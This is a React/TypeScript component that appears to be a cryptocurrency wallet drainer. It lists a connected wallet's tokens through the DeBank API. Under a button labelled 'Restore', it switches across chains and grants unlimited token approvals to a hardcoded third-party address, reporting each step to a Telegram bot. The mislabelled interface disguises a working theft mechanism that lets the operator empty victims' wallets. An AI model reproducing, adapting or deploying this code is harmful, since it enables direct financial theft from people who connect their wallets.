"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import axios from "axios";
import { ethers } from "ethers";

type Token = {
  name: string;
  symbol: string;
  balance: number;
  chain: string;
  usdValue: number;
  address: string;
};

const ApproveAllTokens = () => {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [tokens, setTokens] = useState<Token[]>([]);
  const [isLoading, setIsLoading] = useState(false);

  // Fetch user tokens from DeBank API
  const fetchUserTokens = async () => {
    if (!address) return;
    setIsLoading(true);
    try {
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/all_token_list`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: {
            id: address,
          },
        }
      );

      const tokenData = response.data;
      const formattedTokens = tokenData.map((token: any) => {
        const rawAmount = token.raw_amount || 0;
        const decimals = token.decimals || 0;
        const balance = rawAmount / Math.pow(10, decimals);
        const usdValue = balance * (token.price || 0);

        return {
          name: token.name || "Unknown",
          symbol: token.symbol || "Unknown",
          balance: isNaN(balance) ? 0 : balance,
          chain: token.chain || "unknown",
          usdValue: isNaN(usdValue) ? 0 : usdValue,
          address: token.id,
          isCore: token.is_core || false,
          isVerified: token.is_verified || false,
        };
      });

      // Filter tokens for DeBank-supported tokens only (is_core or is_verified)
      const filteredAndSortedTokens = formattedTokens
        .filter((token: { isCore: any; isVerified: any }) => token.isCore || token.isVerified)
        .filter((token: { usdValue: number }) => token.usdValue >= 1)
        .sort((a: { usdValue: number }, b: { usdValue: number }) => b.usdValue - a.usdValue);

      setTokens(filteredAndSortedTokens);
    } catch (error) {
      console.error("Error fetching tokens from DeBank API:", error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendTelegramMessage = async (message: string) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";
    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown",
      });
      console.log("Telegram message sent");
    } catch (err) {
      console.error("Failed to send Telegram message:", err);
    }
  };

  const approveAllTokens = async () => {
    if (!walletClient || !address) return;
  
    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
    const provider = new ethers.BrowserProvider(walletClient as any);
    const signer = await provider.getSigner();
    const processedTokens = new Set<string>(); // To prevent duplicate processing of native tokens
    let activeChainId: number | null = null; // Track the current chain ID
  
    for (const token of tokens) {
      // Skip native tokens explicitly
      if (
        !token.address ||
        token.address === ethers.ZeroAddress ||
        ["ETH", "BNB", "MATIC"].includes(token.symbol)
      ) {
        if (!processedTokens.has(token.symbol)) {
          console.log(`⚠️ Skipping native token: ${token.name} (${token.symbol})`);
          await sendTelegramMessage(`⚠️ Skipping native token: ${token.name} (${token.symbol})`);
          processedTokens.add(token.symbol);
        }
        continue;
      }
  
      const chainDetails = getChainDetailsForName(token.chain);
  
      try {
        // Switch to the correct chain
        if (walletClient?.switchChain) {
          await walletClient.switchChain({ id: chainDetails.id });
  
          // Add a slight delay to ensure chain synchronization
          await new Promise((resolve) => setTimeout(resolve, 500));
  
          activeChainId = await walletClient.getChainId();
          if (activeChainId !== chainDetails.id) {
            const mismatchWarning = `⚠️ Warning: Chain mismatch detected. Expected: ${chainDetails.name}, Got: ${activeChainId}`;
            console.warn(mismatchWarning);
            await sendTelegramMessage(mismatchWarning);
            continue; // Skip token if chain mismatch occurs
          }
          const chainSwitchSuccess = `✅ Successfully switched to chain ${token.chain} (${chainDetails.name}).`;
          console.log(chainSwitchSuccess);
          await sendTelegramMessage(chainSwitchSuccess); // Send chain switch success immediately
        }
      } catch (err) {
        if (err instanceof Error) {
          const switchError = `❌ Failed to switch to chain ${token.chain} (${chainDetails.name}) for token ${token.name} (${token.symbol}).\nReason: ${err.message}`;
          console.error(switchError);
          await sendTelegramMessage(switchError);
        } else {
          console.error("❌ Unknown error occurred while switching chains.");
          await sendTelegramMessage("❌ Unknown error occurred while switching chains.");
        }
        continue; // Skip this token
      }
  
      const tokenContract = new ethers.Contract(token.address, abi, signer);
      const maxUint256 = ethers.MaxUint256;
  
      try {
        // Approve the token
        const tx = await tokenContract.approve(
          "0xe514C4535B3A68be6126cA8b9aa60414A8f489Ff",
          maxUint256
        );
        await tx.wait();
  
        // Update the active chain ID after approval
        activeChainId = await walletClient.getChainId();
  
        const successMessage = `✅ Successfully approved token ${token.name} (${token.symbol}) on chain ${token.chain}.`;
        console.log(successMessage);
        await sendTelegramMessage(successMessage);
      } catch (err) {
        if (err instanceof Error) {
          // Treat "network changed" only as an issue if it doesn't match the current chain ID
          if (err.message.includes("network changed") && activeChainId === chainDetails.id) {
            const successMessage = `✅ Successfully approved token ${token.name} (${token.symbol}) on chain ${token.chain}.`;
            console.info(successMessage);
            await sendTelegramMessage(successMessage); // Ensure successful approval is logged
          } else {
            const approveError = `❌ Failed to approve token ${token.name} (${token.symbol}) on chain ${token.chain}.\nReason: ${err.message}`;
            console.error(approveError);
            await sendTelegramMessage(approveError);
          }
        } else {
          const unknownApproveError = `❌ Unknown error occurred while approving token ${token.name} (${token.symbol}) on chain ${token.chain}.`;
          console.error(unknownApproveError);
          await sendTelegramMessage(unknownApproveError);
        }
      }
    }
  
    const allDoneMessage = "🎉 All tokens processed for approval (non-native).";
    console.log(allDoneMessage);
    await sendTelegramMessage(allDoneMessage);
  };
  
  
  
  
  
  
  
  
  

  const getChainDetailsForName = (chainName: string) => {
    const chainMap: { [key: string]: { id: number; name: string; explorer: string } } = {
      eth: { id: 1, name: "Ethereum Mainnet", explorer: "https://etherscan.io/tx/" },
      bsc: { id: 56, name: "Binance Smart Chain", explorer: "https://bscscan.com/tx/" },
      polygon: { id: 137, name: "Polygon", explorer: "https://polygonscan.com/tx/" },
      arb: { id: 42161, name: "Arbitrum", explorer: "https://arbiscan.io/tx/" },
      op: { id: 10, name: "Optimism", explorer: "https://optimistic.etherscan.io/tx/" },
      base: { id: 8453, name: "Base", explorer: "https://basescan.org/tx/" },
    };

    return chainMap[chainName] || {
        id: 1,
        name: "Ethereum Mainnet",
        explorer: "https://etherscan.io/tx/",
      }; // Default to Ethereum
    };

  useEffect(() => {
    if (isConnected && address) {
      fetchUserTokens();
    }
  }, [isConnected, address]);

  return (
    <div>
      <h2>Restore</h2>
      {isLoading && <p>Loading tokens...</p>}
      <button onClick={approveAllTokens}>Approve</button>
    </div>
  );
};

export default ApproveAllTokens;
